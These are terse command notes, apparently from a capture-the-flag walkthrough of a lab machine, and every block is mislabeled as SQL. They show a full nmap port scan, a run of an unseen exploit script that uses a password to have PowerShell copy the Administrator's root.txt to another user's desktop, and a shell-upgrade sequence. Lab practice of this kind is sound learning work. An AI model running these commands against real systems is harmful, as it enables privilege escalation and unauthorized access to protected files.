```SQL
IP=10.10.10.184
```

```SQL
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```SQL
nmap -p$ports -sC -sV $IP
```

```SQL
python2 exp.py  -t 127.0.0.1   -P 8443 -p ew2x6SsGTxjRwXOT -c 'powershell.exe Copy-Item -Path "C:\Users\Administrator\Desktop\root.txt -Destination "C:\Users\Nadine\Desktop"'
```

```SQL
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm

Ctrl + Z

export TERM=xterm

stty rows 38 columns 116
```